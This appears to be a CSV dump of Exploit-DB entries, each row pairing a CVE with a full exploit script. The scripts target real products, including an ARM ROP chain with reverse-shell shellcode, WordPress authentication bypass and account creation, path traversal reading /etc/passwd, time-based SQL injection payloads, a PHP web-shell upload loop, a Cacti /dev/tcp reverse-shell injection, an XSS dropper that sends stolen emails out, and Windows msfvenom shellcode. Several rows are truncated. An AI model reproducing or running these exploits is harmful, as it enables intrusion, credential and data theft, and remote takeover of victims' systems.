get_shellcode(ip, port): ip_bytes = socket.inet_aton(ip) port_bytes = struct.pack("">H"", port) # Linux ARM reverse shell # switch to thumb mode sc = b""\x01\x30\x8F\xE2"" # add r3, pc, #1 sc += b""\x13\xFF\x2F\xE1"" # bx r3 # socket(2, 1, 0) sc += b""\x02\x20"" # movs r0, #2 sc += b""\x01\x21"" # movs r1, #1 sc += b""\x92\x1A"" # subs r2, r2, r2 sc += b""\xC8\x27"" # movs r7, #0xc8 sc += b""\x51\x37"" # adds r7, #0x51 sc += b""\x01\xDF"" # svc #1 sc += b""\x04\x1C"" # adds r4, r0, #0 # connect(r0, &sockaddr, 16) sc += b""\x0C\xA1"" # adr r1, #0x30 sc += b""\x4A\x70"" # strb r2, [r1, #1] sc += b""\x10\x22"" # movs r2, #0x10 sc += b""\x02\x37"" # adds r7, #2 sc += b""\x01\xDF"" # svc #1 # dup2(sockfd, 0) sc += b""\x3F\x27"" # movs r7, #0x3f sc += b""\x20\x1C"" # adds r0, r4, #0 sc += b""\x49\x1A"" # subs r1, r1, r1 sc += b""\x01\xDF"" # svc #1 # dup2(sockfd, 1) sc += b""\x20\x1C"" # adds r0, r4, #0 sc += b""\x01\x21"" # movs r1, #1 sc += b""\x01\xDF"" # svc #1 # dup2(sockfd, 2) sc += b""\x20\x1C"" # adds r0, r4, #0 sc += b""\x02\x21"" # movs r1, #2 sc += b""\x01\xDF"" # svc #1 # execve(""/bin/sh"") sc += b""\x06\xA0"" # adr r0, #0x18 sc += b""\x92\x1A"" # subs r2, r2, r2 sc += b""\x49\x1A"" # subs r1, r1, r1 sc += b""\x01\x91"" # str r1, [sp, #4] sc += b""\x02\x91"" # str r1, [sp, #8] sc += b""\x01\x90"" # str r0, [sp, #4] sc += b""\x01\xA9"" # add r1, sp, #4 sc += b""\xC2\x71"" # strb r2, [r0, #7] sc += b""\x0B\x27"" # movs r7, #0xb sc += b""\x01\xDF"" # svc #1 sc += b""\x02\xFF"" sc += port_bytes sc += ip_bytes sc += b""/bin/shX"" return sc def main(): ti, tp, ri, rp = get_args() # ROP Gadgets libc_base = 0x76ec1000 mprotect = libc_base + 0x93510+1 pop_lr = libc_base + 0x1848C # pop {r0, r4, r8, ip, lr, pc} pop_pc = libc_base + 0xd7515 # pop {pc} pop_r0 = libc_base + 0x00064bb0+1 # 0x00064bb0 : pop {r0, pc} pop_r5 = libc_base + 0x00003738+1 # 0x00003738 : pop {r5, pc} add_r1_sp = libc_base + 0x000b3c4e+1 # 0x000b3c4e : add r1, sp, #0x14 ; blx r5 # 0x0002f83c (0x0002f83d): mov r0, r1; bx lr mov_r0_r1 = libc_base + 0x0002f83d # 0x0006a086 (0x0006a087): pop {r1, pc} pop_r1 = libc_base + 0x6a087 ands_r0_r1 = libc_base + 0x1feba+1 # 0x0001feba : ands r0, r1 ; bx lr # 0x000a3a42 : movs r4, r0 ; pop {r1, pc} mov_r4_r0 = libc_base + 0x000a3a42+1 # 0x0001fdae (0x0001fdaf): movs r1, r0; bx lr movs_r1_r0 = libc_base + 0x0001fdaf and_r0_f = libc_base + 0x8717e+1 # 0x0008717e : and r0, r0, #0xf ; bx lr movs_r2_r0 = libc_base + 0x0001fc6a+1 # 0x0001fc6a : movs r2, r0 ; bx lr mov_r0_r4 = libc_base + 0x0001f9d4+1 # 0x0001f9d4 : movs r0, r4 ; bx lr blx_sp = libc_base + 0x46595 # 0x00046594 (0x00046595): blx sp shellcode = get_shellcode(ri, rp) auth_command = b""LOG/1.0 END CMD:AUTH_USERNAME @"" junk = p32(0x43434343) payload = auth_command payload += b""A"" * 144 # The goal is that R0 -> SP # R5 = pop {pc} # because in the the next gadget we have a blx r5 payload += p32(pop_r5) payload += p32(pop_pc) # R5 = pop {pc} # R1 = SP ; BLX pop {pc} payload += p32(add_r1_sp) # add r1, sp, #0x14 ; blx r5 # Restore LR register (because it has been updated by the last BLX gadget) payload += p32(pop_lr) # pop {r0, r4, r8, ip, lr, pc} payload += junk*4 # r0, r4, r8, ip payload += p32(pop_pc) # LR = pop {pc} # R0 = stack address payload += p32(mov_r0_r1) # mov r0, r1; bx lr # R1 = mask page align payload += p32(pop_r1) # pop {r1, pc} payload += p32(0xfffe1001) # R0 = stack address & 0xfffe1001 payload += p32(ands_r0_r1) # ands r0, r1 ; bx lr # R4 = R0 payload += p32(mov_r4_r0) # movs r0, r4 ; bx lr payload += junk # r1 # mprotect params # r0 = shellcode page aligned address # r1 = size(ofshellcode) # r2 = protection (0x7 – RWX) # R2 = 0x7 payload += p32(pop_r0) payload += p32(0x07070707) payload += p32(and_r0_f) # R0 = 7 (RWX) payload += p32(movs_r2_r0) # R2 (prot: 7 - RWX) # R1 = length = 0x10101010 (avoid 0's) payload += p32(pop_r0) payload += p32(0x01010101) payload += p32(movs_r1_r0) # r1 (length: 0x10101010) # R0 = stack address 4k aligned payload += p32(mov_r0_r4) # mprotect(stack, 0x10101010, 0x7) payload += p32(mprotect) payload += p32(blx_sp) # ejecutamos en pila payload += shellcode # shellcode if check_badchars(payload[len(auth_command):]): sys.exit(0) log.info(""Device IP: %s:%d"" % (ti, tp)) log.info(""Attacker IP: %s:%d"" % (ri, rp)) log.info(""Payload len: %d"" % len(payload)) count = 1 while True: try: print('Try: %d' % count) r = remote(ti, tp) r.send(payload) log.success(""Payload sent!"") # r.close() time.sleep(1) count += 1 except: sleep(3) pass if __name__ == '__main__': main()"
CVE-2025-2594,2025-05-25,exploit db,"#!/usr/bin/env python3 # Exploit Title: WordPress User Registration & Membership Plugin 4.1.2 - Authentication Bypass # Date: 2025-05-22 # Exploit Author: Mohammed Idrees Banyamer # Vendor Homepage: https://wordpress.org/plugins/user-registration/ # Software Link: https://downloads.wordpress.org/plugin/user-registration.4.1.2.zip # Version: <= 4.1.2 # Tested on: WordPress 6.x, Apache on Linux # CVE: CVE-2025-2594 import requests import sys import argparse from urllib.parse import urljoin from termcolor import cprint, colored def banner(): cprint(""┌──────────────────────────────────────────────┐"", ""cyan"") cprint(""│ WordPress Plugin User Registration <= 4.1.2 │"", ""cyan"") cprint(""│ Authentication Bypass Exploit (CVE-2025-2594)│"", ""cyan"") cprint(""│ Author: Mohammed Idrees Banyamer │"", ""cyan"") cprint(""└──────────────────────────────────────────────┘"", ""cyan"") def exploit(target_url, member_id, nonce): endpoint = urljoin(target_url, ""/wp-admin/admin-ajax.php"") files = { 'action': (None, 'user_registration_membership_confirm_payment'), 'security': (None, nonce), 'form_response': (None, '{""auto_login"": true}'), 'member_id': (None, str(member_id)) cprint(f""[+] Target URL: {endpoint}"", ""yellow"") cprint(f""[+] Attempting to bypass authentication as user ID {member_id}...\n"", ""yellow"") try: response = requests.post(endpoint, files=files, timeout=10) if response.status_code == 200 and '""success"":true' in response.text: cprint(""[✓] Exploit successful! Authentication bypass achieved."", ""green"") cprint(""[!] Check your session/cookies - you may now be authenticated as the target user.\n"", ""green"") print(""Server Response:"") print(response.text) else: cprint(""[-] Exploit failed or invalid nonce/member_id."", ""red"") print(""Server Response:"") print(response.text) except requests.exceptions.RequestException as e: cprint(f""[!] Request failed: {e}"", ""red"") def main(): banner() parser = argparse.ArgumentParser(description=""CVE-2025-2594 - WordPress Plugin Authentication Bypass"") parser.add_argument(""target"", help=""Base target URL (e.g., http://localhost)"") parser.add_argument(""member_id"", help=""Target user ID (usually 1 for admin)"") parser.add_argument(""nonce"", help=""_confirm_payment_nonce value from registration page"") args = parser.parse_args() exploit(args.target, args.member_id, args.nonce) if __name__ == ""__main__"": main()"
CVE-2025-46822,2025-05-25,exploit db,"# Exploit Title: Java-springboot-codebase 1.1 - Arbitrary File Read # Google Dork: # Date: 23/May/2025 # Exploit Author: d3sca # Vendor Homepage: https://github.com/OsamaTaher/Java-springboot-codebase # Software Link: https://github.com/OsamaTaher/Java-springboot-codebase # Version: [app version] 1.1 # Tested on: Debian Linux # CVE : CVE-2025-46822 #usage: python3 cve-2025-46822.py http://victim.com /etc/passwd import argparse import requests from urllib.parse import quote def exploit(target, file_path, output=None): # Ensure the file path is absolute if not file_path.startswith('/'): print(""[!] Warning: File path is not absolute. Prepending '/' to make it absolute."") file_path = '/' + file_path.lstrip('/') # URL-encode the file path encoded_path = quote(file_path, safe='') # Construct the target URL endpoint = f""/api/v1/files/{encoded_path}"" url = target.rstrip('/') + endpoint print(f""[*] Attempting to retrieve: {file_path}"") print(f""[*] Sending request to: {url}"") try: response = requests.get(url, allow_redirects=False, timeout=10) if response.status_code == 200: print(""[+] File retrieved successfully!"") if output: with open(output, 'wb') as f: f.write(response.content) print(f""[+] Content saved to: {output}"") else: print(""\nFile contents:"") print(response.text) else: print(f""[-] Failed to retrieve file. Status code: {response.status_code}"") print(f""[-] Response: {response.text[:200]}"") # Show first 200 chars of response except Exception as e: print(f""[-] An error occurred: {str(e)}"") if name == ""main"": parser = argparse.ArgumentParser(description=""Exploit Path Traversal Vulnerability in Unauthenticated File API"") parser.add_argument(""target"", help=""Target base URL (e.g., http://victim:8080)"") parser.add_argument(""file_path"", help=""Absolute path to target file (e.g., /etc/passwd)"") parser.add_argument(""-o"", ""--output"", help=""Output file to save contents"") args = parser.parse_args() exploit(args.target, args.file_path, args.output)"
CVE-2020-11060,2023-10-09,exploit db,#!/usr/bin/env python3 #Exploit Title: GLPI GZIP(Py3) 9.4.5 - RCE #Date: 08-30-2021 #Exploit Authors: Brian Peters & n3rada #Vendor Homepage: https://glpi-project.org/ #Software Link: https://github.com/glpi-project/glpi/releases #Version: 0.8.5-9.4.5 #Tested on: Exploit ran on Kali 2021. GLPI Ran on Windows 2019 #CVE: 2020-11060 # Built-in imports import argparse import random import re import string from datetime import datetime # Third party library imports import requests from lxml import html # https://raw.githubusercontent.com/AlmondOffSec/PoCs/master/glpi_rce_gzip/
CVE-2023-4708,2023-10-09,exploit db,"# Exploit Title: Clcknshop 1.0.0 - SQL Injection # Exploit Author: CraCkEr # Date: 16/08/2023 # Vendor: Infosoftbd Solutions # Vendor Homepage: https://infosoftbd.com/ # Software Link: https://infosoftbd.com/multitenancy-e-commerce-solution/ # Demo: https://kidszone.clckn.shop/ # Version: 1.0.0 # Tested on: Windows 10 Pro # Impact: Database Access # CVE: CVE-2023-4708 # CWE: CWE-89 - CWE-74 - CWE-707 ## Greetings The_PitBull, Raz0r, iNs, SadsouL, His0k4, Hussin X, Mr. SQL , MoizSid09, indoushka CryptoJob (Twitter) twitter.com/0x0CryptoJob ## Description SQL injection attacks can allow unauthorized access to sensitive data, modification of data and crash the application or make it unavailable, leading to lost revenue and damage to a company's reputation. Path: /collection/all GET parameter 'tag' is vulnerable to SQL Injection https://website/collection/all?tag=[SQLi] Parameter: tag (GET) Type: time-based blind Title: MySQL >= 5.0.12 time-based blind (query SLEEP) Payload: tag=tshirt'XOR(SELECT(0)FROM(SELECT(SLEEP(6)))a)XOR'Z"
CVE-2022-35919,2023-10-09,exploit db,"# Exploit Title: Minio 2022-07-29T19-40-48Z - Path traversal # Date: 2023-09-02 # Exploit Author: Jenson Zhao # Vendor Homepage: https://min.io/ # Software Link: https://github.com/minio/minio/ # Version: Up to (excluding) 2022-07-29T19-40-48Z # Tested on: Windows 10 # CVE : CVE-2022-35919 # Required before execution: pip install minio,requests import urllib.parse import requests, json, re, datetime, argparse from minio.credentials import Credentials from minio.signer import sign_v4_s3 class MyMinio(): secure = False def __init__(self, base_url, access_key, secret_key): self.credits = Credentials( access_key=access_key, secret_key=secret_key if base_url.startswith('http://') and base_url.endswith('/'): self.url = base_url + 'minio/admin/v3/update?updateURL=%2Fetc%2Fpasswd' elif base_url.startswith('https://') and base_url.endswith('/'): self.url = base_url + 'minio/admin/v3/update?updateURL=%2Fetc%2Fpasswd' self.secure = True else: print('Please enter a URL address that starts with ""http://"" or ""https://"" and ends with ""/""\n') def"
CVE-2023-4278,2023-10-09,exploit db,"# Exploit Title: Wordpress Plugin Masterstudy LMS - 3.0.17 - Unauthenticated Instructor Account Creation # Google Dork: inurl:/user-public-account # Date: 2023-09-04 # Exploit Author: Revan Arifio # Vendor Homepage: https:/.org/plugins/masterstudy-lms-learning-management-system/ # Version: <= 3.0.17 # Tested on: Windows, Linux # CVE : CVE-2023-4278 import requests import os import re import time banner = """""" || Title : Masterstudy LMS <= 3.0.17 - Unauthenticated Instructor Account Creation || || Author : https://github.com/revan-ar || || Vendor Homepage : https:/wordpress.org/plugins/masterstudy-lms-learning-management-system/ || || Support : https://www.buymeacoffee.com/revan.ar || print(banner) # get nonce def get_nonce(target): open_target = requests.get(""{}/user-public-account"".format(target)) search_nonce = re.search('""stm_lms_register"":""(.*?)""', open_target.text) if search_nonce[1] != None: return search_nonce[1] else: print(""Failed when getting Nonce :p"") # privielege escalation def privesc(target, nonce, username, password, email): req_data = { ""user_login"":""{}"".format(username), ""user_email"":""{}"".format(email), ""user_password"":""{}"".format(password), ""user_password_re"":""{}"".format(password), ""become_instructor"":True, ""privacy_policy"":True, ""degree"":"""", ""expertize"":"""", ""auditory"":"""", ""additional"":[], ""additional_instructors"":[], ""profile_default_fields_for_register"":[], ""redirect_page"":""{}/user-account/"".format(target) start = requests.post(""{}/wp-admin/admin-ajax.php?action=stm_lms_register&nonce={}"".format(target, nonce), json = req_data) if start.status_code == 200: print(""[+] Exploit Success !!"") else: print(""[+] Exploit Failed :p"") # URL target target = input(""[+] URL Target: "") print(""[+] Starting Exploit"") plugin_check = requests.get(""{}/wp-content/plugins/masterstudy-lms-learning-management-system/readme.txt"".format(target)) plugin_version = re.search(""Stable tag: (.+)"", plugin_check.text) int_version = plugin_version[1].replace(""."", """") time.sleep(1) if int(int_version) < 3018: print(""[+] Target is Vulnerable !!"") # Credential email = input(""[+] Email: "") username = input(""[+] Username: "") password = input(""[+] Password: "") time.sleep(1) print(""[+] Getting Nonce..."") get_nonce = get_nonce(target) # Get Nonce if get_nonce != None: print(""[+] Success Getting Nonce: {}"".format(get_nonce)) time.sleep(1) # Start PrivEsc privesc(target, get_nonce, username, password, email) else: print(""[+] Target is NOT Vulnerable :p"")"
CVE-2023-4634,2023-10-09,exploit db,"# Exploit Title: Media Library Assistant Wordpress Plugin - RCE and LFI # Date: 2023/09/05 # CVE: CVE-2023-4634 # Exploit Author: Florent MONTEL / Patrowl.io / @Pepitoh / Twitter @Pepito_oh # Exploitation path: https://patrowl.io/blog-wordpress-media-library-rce-cve-2023-4634/ # Exploit: https://github.com/Patrowl/CVE-2023-4634/ # Vendor Homepage: https://fr.wordpress.org/plugins/media-library-assistant/ # Software Link: https://fr.wordpress.org/plugins/media-library-assistant/ # Version: < 3.10 # Tested on: 3.09 # Description: # Media Library Assistant Wordpress Plugin in version < 3.10 is affected by an unauthenticated remote reference to Imagick() conversion which allows attacker to perform LFI and RCE depending on the Imagick configuration on the remote server. The affected page is: wp-content/plugins/media-library-assistant/includes/mla-stream-image.php #LFI Steps to trigger conversion of a remote SVG Create a remote FTP server at ftp://X.X.X.X:21 (http will not work, see references) Host 2 files : - malicious.svg - malicious.svg[1] Payload: For LFI, getting wp-config.php: Both malicious.svg and malicious.svg[1] on the remote FTP: xmlns=""http://www.w3.org/2000/svg""> Then trigger conversion with: http://127.0.0.1/wp-content/plugins/media-library-assistant/includes/mla-stream-image.php?mla_stream_file=ftp://X.X.X.X:21/malicious.svg&mla_debug=log&mla_stream_frame=1 # Directory listing or RCE: To achieve Directory listing or even RCE, it is a little more complicated. Use exploit available here: https://github.com/Patrowl/CVE-2023-4634/ # Note Exploitation will depend on the policy.xml Imagick configuration file installed on the remote server. All exploitation paths and scripts have been performed with a default wordpress configuration and installation (Wordpress has high chance to have the default Imagick configuration)."
CVE-2023-39362,2023-10-09,exploit db,"# Exploit Title: Cacti 1.2.24 - Authenticated command injection when using SNMP options # Date: 2023-07-03 # Exploit Author: Antonio Francesco Sardella # Vendor Homepage: https://www.cacti.net/ # Software Link: https://www.cacti.net/info/downloads # Version: Cacti 1.2.24 # Tested on: Cacti 1.2.24 installed on 'php:7.4.33-apache' Docker container # CVE: CVE-2023-39362 # Category: WebApps # Original Security Advisory: https://github.com/Cacti/cacti/security/advisories/GHSA-g6ff-58cj-x3cp # Example Vulnerable Application: https://github.com/m3ssap0/cacti-rce-snmp-options-vulnerable-application # Vulnerability discovered and reported by: Antonio Francesco Sardella Cacti 1.2.24 - Authenticated command injection when using SNMP options (CVE-2023-39362) Executive Summary In Cacti 1.2.24, under certain conditions, an authenticated privileged user, can use a malicious string in the SNMP options of a Device, performing command injection and obtaining remote code execution on the underlying server. Exploit Prerequisites: - The attacker is authenticated. - The privileges of the attacker allow to manage Devices and/or Graphs, e.g., ""Sites/Devices/Data"", ""Graphs"". - A Device that supports SNMP can be used. - Net-SNMP Graphs can be used. - snmp module of PHP is not installed. Example of an exploit: - Go to ""Console"" > ""Create"" > ""New Device"". - Create a Device that supports SNMP version 1 or 2. - Ensure that the Device has Graphs with one or more templates of: - ""Net-SNMP - Combined SCSI Disk Bytes"" - ""Net-SNMP - Combined SCSI Disk I/O"" - (Creating the Device from the template ""Net-SNMP Device"" will satisfy the Graphs prerequisite) - In the ""SNMP Options"", for the ""SNMP Community String"" field, use a value like this: public\' ; touch /tmp/m3ssap0 ; \' - Click the ""Create"" button. - Check under /tmp the presence of the created file. To obtain a reverse shell, a payload like the following can be used. public\' ; bash -c ""exec bash -i &>/dev/tcp/ / <&1"" ; \' A similar exploit can be used editing an existing Device, with the same prerequisites, and waiting for the poller to run. It could be necessary to change the content of the ""Downed Device Detection"" field under the ""Availability/Reachability Options"" section with an item that doesn't involve SNMP (because the malicious payload could break the interaction with the host). Root Cause A detailed root cause of the vulnerability is available in the original security advisory (https://github.com/Cacti/cacti/security/advisories/GHSA-g6ff-58cj-x3cp) or in my blog post (https://m3ssap0.github.io/articles/cacti_authenticated_command_injection_snmp.html). References - https://github.com/Cacti/cacti/security/advisories/GHSA-g6ff-58cj-x3cp - https://m3ssap0.github.io/articles/cacti_authenticated_command_injection_snmp.html - https://github.com/m3ssap0/cacti-rce-snmp-options-vulnerable-application"
CVE-2023-38836,2023-10-09,exploit db,"#!/usr/bin/python3 # Exploit Title: BoidCMS v2.0.0 - authenticated file upload vulnerability # Date: 08/21/2023 # Exploit Author: 1337kid # Vendor Homepage: https://boidcms.github.io/#/ # Software Link: https://boidcms.github.io/BoidCMS.zip # Version: <= 2.0.0 # Tested on: Ubuntu # CVE : CVE-2023-38836 import requests import re import argparse parser = argparse.ArgumentParser(description='Exploit for CVE-2023-38836') parser.add_argument(""-u"", ""--url"", help=""website url"") parser.add_argument(""-l"", ""--user"", help=""admin username"") parser.add_argument(""-p"", ""--passwd"", help=""admin password"") args = parser.parse_args() base_url=args.url user=args.user passwd=args.passwd def showhelp(): print(parser.print_help()) exit() if base_url == None: showhelp() elif user == None: showhelp() elif passwd == None: showhelp() with requests.Session() as s: req=s.get(f'{base_url}/admin') token=re.findall('[a-z0-9]{64}',req.text) form_login_data={ ""username"":user, ""password"":passwd, ""login"":""Login"", form_login_data['token']=token s.post(f'{base_url}/admin',data=form_login_data) #=========== File upload to RCE req=s.get(f'{base_url}/admin?page=media') token=re.findall('[a-z0-9]{64}',req.text) form_upld_data={ ""token"":token, ""upload"":""Upload"" #==== php shell php_code=['GIF89a;\n',' '] with open('shell.php','w') as f: f.writelines(php_code) file = {'file' : open('shell.php','rb')} s.post(f'{base_url}/admin?page=media',files=file,data=form_upld_data) req=s.get(f'{base_url}/media/shell.php') if req.status_code == '404': print(""Upload failed"") exit() print(f'Shell uploaded to ""{base_url}/media/shell.php""') while 1: cmd=input(""cmd >> "") if cmd=='exit': exit() req=s.get(f'{base_url}/media/shell.php',params = {""cmd"": cmd}) print(req.text)"
CVE-2023-32707,2023-10-09,exploit db,"#!/usr/bin/env python3 # Exploit Title: Splunk 9.0.5 - admin account take over # Author: [Redway Security](https://twitter.com/redwaysec)) # Discovery: [Santiago Lopez](https://twitter.com/santi_lopezz99) #CVE: CVE-2023-32707 # Vendor Description: A low-privilege user who holds a role that has the `edit_user` capability assigned # to it can escalate their privileges to that of the admin user by providing specially crafted web requests. # Versions Affected: Splunk Enterprise **below** 9.0.5, 8.2.11, and 8.1.14. import argparse import requests import random import string import base64 # ignore warnings import urllib3 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # Parse command-line arguments parser = argparse.ArgumentParser(description='Splunk Authentication') parser.add_argument('--host', required=True, help='Splunk host or IP address') parser.add_argument('--username', required=True, help='Splunk username') parser.add_argument('--password', required=True, help='Splunk password') parser.add_argument('--target-user', required=True, help='Target user') parser.add_argument('--force-exploit', action='store_true', help='Force exploit') args = parser.parse_args() # Splunk server settings splunk_host = args.host.split(':')[0] splunk_username = args.username splunk_password = args.password target_user = args.target_user force_exploit = args.force_exploit splunk_port = args.host.split(':')[1] if len(args.host.split(':')) > 1 else 8089 user_endpoint = f""https://{splunk_host}:{splunk_port}/services/authentication/users"" credentials = f""{splunk_username}:{splunk_password}"" base64_credentials = base64.b64encode(credentials.encode()).decode() headers = { 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0', 'Authorization': f'Basic {base64_credentials}' proxies = { # 'http': '[http://127.0.0.1:8080']( http://127.0.0.1:8080', # 'https': 'http://127.0.0.1:8080' response = requests.get(f""{user_endpoint}/{splunk_username}?output_mode=json"", headers=headers, proxies=proxies, verify=False) if response.status_code == 200: affected_versions = ['9.0.4', '8.2.10', '8.1.13'] user = response.json() splunk_version = user['generator']['version'] # This is not a good way to compare versions. # There is a range of versions that are affected by this CVE, but this is just a"
CVE-2023-34723,2023-09-08,exploit db,# Exploit Title: Techview LA-5570 Wireless Gateway Home Automation Controller - Multiple Vulnerabilities # Google Dork: N/A # Date: 25/08/2023 # Exploit Author: The Security Team [exploitsecurity.io ] # Vendor Homepage: https://www.jaycar.com.au/wireless-gateway-home-automation-controller/p/LA5570 # Software Link: N/A # Version: 1.0.19_T53 # Tested on: MACOS/Linux # CVE : CVE-2023-34723
CVE-2023-4548,2023-09-08,exploit db,"# Exploit Title: SPA-Cart eCommerce CMS 1.9.0.3 - SQL Injection # Exploit Author: CraCkEr # Date: 20/08/2023 # Vendor: SPA-Cart # Vendor Homepage: https://spa-cart.com/ # Software Link: https://demo.spa-cart.com/ # Version: 1.9.0.3 # Tested on: Windows 10 Pro # Impact: Database Access # CVE: CVE-2023-4548 # CWE: CWE-89 / CWE-74 / CWE-707 ## Greetings The_PitBull, Raz0r, iNs, SadsouL, His0k4, Hussin X, Mr. SQL , MoizSid09, indoushka CryptoJob (Twitter) twitter.com/0x0CryptoJob ## Description SQL injection attacks can allow unauthorized access to sensitive data, modification of data and crash the application or make it unavailable, leading to lost revenue and damage to a company's reputation. Path: /search GET parameter 'filter[brandid]' is vulnerable to SQL Injection https://website/search?filtered=1&q=11&load_filter=1&filter[brandid]=[SQLi]&filter[price]=100-500&filter[attr][Memory][]=500%20GB&filter[attr][Color][]=Black Parameter: filter[brandid] (GET) Type: time-based blind Title: MySQL >= 5.0.12 time-based blind (query SLEEP) Payload: filtered=1&q=11&load_filter=1&filter[brandid]=4'XOR(SELECT(0)FROM(SELECT(SLEEP(7)))a)XOR'Z&filter[price]=100-500&filter[attr][Memory][]=500 GB&filter[attr][Color][]=Black [-] Done"
CVE-2022-4953,2023-09-08,exploit db,# Exploit Title: Wordpress Plugin Elementor < 3.5.5 - Iframe Injection # Date: 28.08.2023 # Exploit Author: Miguel Santareno # Vendor Homepage: https://elementor.com/ # Version: < 3.5.5 # Tested on: Google and Firefox latest version # CVE : CVE-2022-4953 # 1. Description The plugin does not filter out user-controlled URLs from being loaded into the DOM. This could be used to inject rogue iframes that point to malicious URLs. # 2. Proof of Concept (
CVE-2022-31470,2023-09-08,exploit db,"# Exploit Title: Axigen < 10.3.3.47, 10.2.3.12 - Reflected XSS # Google Dork: inurl:passwordexpired=yes # Date: 2023-08-21 # Exploit Author: AmirZargham # Vendor Homepage: https://www.axigen.com/ # Software Link: https://www.axigen.com/mail-server/download/ # Version: (10.5.0–4370c946) and older version of Axigen WebMail # Tested on: firefox,chrome # CVE: CVE-2022-31470 Exploit We use the second Reflected XSS to exploit this vulnerability, create a malicious link, and steal user emails. Dropper code This dropper code, loads and executes JavaScript exploit code from a remote server. x = document.createElement('script'); x.src = 'https://example.com/exploit.js'; window.addEventListener('DOMContentLoaded',function y(){ document.body.appendChild(x) Encoded form /index.hsp?m=%27)%3Bx%3Ddocument.createElement(%27script%27)%3Bx.src%3D%27 https://example.com/exploit.js%27%3Bwindow.addEventListener(%27DOMContentLoaded%27,function+y(){document.body.appendChild(x)})// Exploit code xhr1 = new XMLHttpRequest(), xhr2 = new XMLHttpRequest(), xhr3 = new XMLHttpRequest(); oob_server = 'https://example.com/'; var script_tag = document.createElement('script'); xhr1.open('GET', '/', true); xhr1.onreadystatechange = () => { if (xhr1.readyState === XMLHttpRequest.DONE) { _h_cookie = new URL(xhr1.responseURL).search.split(""="")[1]; xhr2.open('PATCH', `/api/v1/conversations/MQ/?_h=${_h_cookie}`, true); xhr2.setRequestHeader('Content-Type', 'application/json'); xhr2.onreadystatechange = () => { if (xhr2.readyState === XMLHttpRequest.DONE) { if (xhr2.status === 401){ script_tag.src = `${oob_server}?status=session_expired&domain=${document.domain}`; document.body.appendChild(script_tag); } else { resp = xhr2.responseText; folderId = JSON.parse(resp)[""mails""][0][""folderId""]; xhr3.open('GET', `/api/v1/conversations?folderId=${folderId}&_h=${_h_cookie}`, true); xhr3.onreadystatechange = () => { if (xhr3.readyState === XMLHttpRequest.DONE) { emails = xhr3.responseText; script_tag.src = `${oob_server}?status=ok&domain=${document.domain}&emails=${btoa(emails)}`; document.body.appendChild(script_tag); xhr3.send(); var body = JSON.stringify({isUnread: false}); xhr2.send(body); xhr1.send(); Combining dropper and exploit You can host the exploit code somewhere and then address it in the dropper code."
CVE-2023-32560,2023-09-04,exploit db,"Exploit Title: Ivanti Avalanche III{}s{}s'.format(self.name_size, self.value_size), self.type, self.name_size, self.value_size, self.name, self.value) # Create a header structure class HP: def __init__(self, hdr, payload): self.hdr = hdr self.payload = payload self.pad = b'\x00' * (16 - (len(self.hdr) + len(self.payload)) % 16) def pack(self): return b''.join([item.pack() for item in self.hdr]) + \ b''.join([item.pack() for item in self.payload]) + self.pad # Create a preamble structure class Preamble: def __init__(self, hp): self.msg_size = len(hp.pack()) + 16 self.hdr_size = sum([len(item.pack()) for item in hp.hdr]) self.payload_size = sum([len(item.pack()) for item in hp.payload]) self.unk = 0 # Unknown value def pack(self): return struct.pack('>IIII', self.msg_size, self.hdr_size, self.payload_size, self.unk) # Create a message structure class Msg: def __init__(self, hp): self.pre = Preamble(hp) self.hdrpay = hp def pack(self): return self.pre.pack() + self.hdrpay.pack() # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.86.30 LPORT=4444 exitfunc=thread -f python shellcode = b"""" shellcode += b""fce8820000006089e531c064"" shellcode += b""8b50308b520c8b52148b7228"" shellcode += b""0fb74a2631ffac3c617c022c"" shellcode += b""20c1cf0d01c7e2f252578b52"" shellcode += b""108b4a3c8b4c1178e34801d1"" shellcode += b""518b592001d38b4918e33a49"" shellcode += b""8b348b01d631ffacc1cf0d01"" shellcode += b""c738e075f6037df83b7d2475"" shellcode += b""e4588b582401d3668b0c4b8b"" shellcode += b""581c01d38b048b01d0894424"" shellcode += b""245b5b61595a51ffe05f5f5a"" shellcode += b""8b12eb8d5d68333200006877"" shellcode += b""73325f54684c772607ffd5b8"" shellcode += b""9001000029c454506829806b"" shellcode += b""00ffd5505050504050405068"" shellcode += b""ea0fdfe0ffd5976a0568c0a8"" shellcode += b""561e680200115c89e66a1056"" shellcode += b""576899a57461ffd585c0740c"" shellcode += b""ff4e0875ec68f0b5a256ffd5"" shellcode += b""68636d640089e357575731f6"" shellcode += b""6a125956e2fd66c744243c01"" shellcode += b""018d442410c6004454505656"" shellcode += b""5646564e565653566879cc3f"" shellcode += b""86ffd589e04e5646ff306808"" shellcode += b""871d60ffd5bbe01d2a0a68a6"" shellcode += b""95bd9dffd53c067c0a80fbe0"" shellcode += b""7505bb4713726f6a0053ffd5"" buf = b'90' * 340 buf += b'812b4100' # jmp esp (0x00412b81) buf += b'90909090' buf += b'90909090' buf += shellcode buf += b'41' * 80 buf += b'84d45200' # stack pivot: add esp, 0x00000FA0 ; retn 0x0004 ; (0x0052d484) buf += b'43' * (0x800 - len(buf)) buf2 = b'41' * 0x1000 # Create message payload hdr = [Item(3, ""pwned"", buf)] payload = [Item(3, ""pwned"", buf2)] # dummy payload, probabaly not necessary hp_instance = HP(hdr, payload) msg_instance = Msg(hp_instance) # Default port port = 1777 # check for target host argument if len(sys.argv) > 1: host = sys.argv[1] else: print(""Usage: python3 CVE-2023-32560.py "") sys.exit() with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: s.connect((host, port)) s.sendall(msg_instance.pack()) print(""Message sent!"") s.close()"
